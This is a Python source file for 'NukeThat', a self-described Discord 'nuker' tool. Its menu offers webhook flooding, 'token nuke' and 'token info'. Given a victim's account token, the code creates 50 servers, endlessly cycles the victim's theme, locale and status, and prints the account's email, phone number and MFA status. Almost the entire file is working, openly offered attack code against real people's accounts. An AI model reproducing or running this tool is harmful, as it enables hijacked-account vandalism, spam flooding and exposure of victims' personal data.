  import os
import json
import requests
import random
import ctypes
from itertools import cycle
from colorama import Fore

author = "Skloahh"
author_discrim = "0666"
author_group = "#NixSquad"
version = "1.0"


def clear():
    os.system('cls')

def menu():
    banner = f"""{Fore.RED}   
    _______________________      )
    ╔╗╔┬ ┬┬┌─┌─┐╔╦╗┬ ┬┌─┐┌┬┐     (
    ║║║│ │├┴┐├┤  ║ ├─┤├─┤ │    .-`-.
    ╝╚╝└─┘┴ ┴└─┘ ╩ ┴ ┴┴ ┴ ┴    {Fore.WHITE}:TNT:{Fore.RED}
    _______________________    :___:

    {Fore.RED}Made by {Fore.WHITE}{author}{Fore.RED}#{Fore.WHITE}{author_discrim}
    {Fore.RED}Group {Fore.WHITE}{author_group}

    {Fore.RED}╔════════════════════╗
    {Fore.RED}║{Fore.WHITE} [1] Webhook nuke   {Fore.RED}║
    {Fore.RED}║{Fore.WHITE} [2] Token Nuke     {Fore.RED}║
    {Fore.RED}║{Fore.WHITE} [3] Token Info     {Fore.RED}║
    {Fore.RED}║{Fore.WHITE} [4] Credits        {Fore.RED}║
    {Fore.RED}║{Fore.WHITE} [0] Exit           {Fore.RED}║
    {Fore.RED}╚════════════════════╝
    {Fore.RESET}
    """
    ctypes.windll.kernel32.SetConsoleTitleW(f'[NukeThat v{version}] | Menu')
    clear()
    print(banner)

menu()
options = int(input("    > Enter your option: "))

while options != 0:
    if options == 1:
        # option 1
        
        webhookurl = input("     > Enter the webhook URL: ")
        if requests.get(webhookurl).status_code == 200:
            print()
            print(f"     {Fore.GREEN}[V] Valid Webhook!{Fore.RESET}")
            print()
            times = int(input("     > Enter a amount of messages to nuke the webhook: "))
            msg = str(input("     > Enter the webhook containing message: "))
            message = {
                "content": msg
            }
            
                
            try:
                ctypes.windll.kernel32.SetConsoleTitleW(f'[NukeThat v{version}] | Nuking Webhook...')
                print()
                print("     Nuking webhook...")
                for _i in range(times):
                    res = requests.post(webhookurl, json=message)
            except Exception as e:
                print(f"     {Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
        else:
            print()
            print(f"     {Fore.RED}[X] Invalid Webhook!{Fore.RESET}")
    elif options == 2:
        # option 2
        
        nuketkn = input("     > Victim Token: ")
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
            'Content-Type': 'application/json',
            'Authorization': nuketkn,
        }
        if requests.get("https://canary.discordapp.com/api/v6/users/@me/", headers=headers).status_code == 200:
            srvnm = input("     > Server name: ")
            request = requests.Session()
            payload = {
                'theme': "light",
                'locale': "ja",
                'message_display_compact': False,
                'inline_embed_media': False,
                'inline_attachment_media': False,
                'gif_auto_play': False,
                'render_embeds': False,
                'render_reactions': False,
                'animate_emoji': False,
                'convert_emoticons': False,
                'enable_tts_command': False,
                'explicit_content_filter': '0',
                'status': "invisible"
            }
            guild = {
                'channels': None,
                'icon': None,
                'name': srvnm,
                'region': "europe"
            } 
            locales = [ 
                "da", "de",
                "en-GB", "en-US",
                "es-ES", "fr",
                "hr", "it",
                "lt", "hu",
                "nl", "no",
                "pl", "pt-BR",
                "ro", "fi",
                "sv-SE", "vi",
                "tr", "cs",
                "el", "bg",
                "ru", "uk",
                "th", "zh-CN",
                "ja", "zh-TW",
                "ko"
            ]
            for _i in range(50):
                requests.post('https://discordapp.com/api/v6/guilds', headers=headers, json=guild)
            while True:
                try:
                    request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload)
                except Exception as e:
                    print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
                else:
                    break
            modes = cycle(["light", "dark"])
            statuses = cycle(["online", "idle", "dnd", "invisible"])
            while True:
                setting = {
                    'theme': next(modes),
                    'locale': random.choice(locales),
                    'status': next(statuses)
                }
                while True:
                    try:
                        request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=setting, timeout=10)
                    except Exception as e:
                        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
                    else:
                        print("     Nuked succesfully!")
        else:
            print()
            print(f"     {Fore.RED}[X] Invalid Token!{Fore.RESET}")
            pass
            
    elif options == 3:
        # option 3

        nuketkn = input("     > User Token: ")

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
            'Content-Type': 'application/json',
            'Authorization': nuketkn,
        }

        req = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
        res = req.json()
        if req.status_code == 200:
            nitro = "No Nitro"
            if "premium_type" in res:
                if res['premium_type'] == 1:
                    nitro = "Nitro Classic"
                if res['premium_type'] == 2:
                    nitro = "Nitro Boost"
            else:
                pass
            print(f"Username: {res['username']}#{res['discriminator']}\nID: {res['id']}\nNitro: {nitro}\nEmail: {res['email']}\nPhone: {res['phone']}\nVerified: {res['verified']}\nMFA: {res['mfa_enabled']}\nLanguage: {res['locale']}")
        else:
            print()
            print(f"     {Fore.RED}[X] Invalid Token!{Fore.RESET}")
            pass
    elif options == 4:
        # option 4
        print(f"     {Fore.RED}Creator : {Fore.WHITE}xSkloahh\n     {Fore.RED}Github : {Fore.WHITE}https://github.com/Skloahh/NukeThat\n     {Fore.RED}Info : {Fore.WHITE}NukeThat is a open-source discord nuker, NukeThat uses the discord api to send post/get requests to edit or get info of the requested token")
    else:
        print("Invalid Option")

    print()
    options = int(input("    > Enter another option: "))

os.system("cls")
print(f"{Fore.YELLOW}Bye!\n{Fore.RESET}")
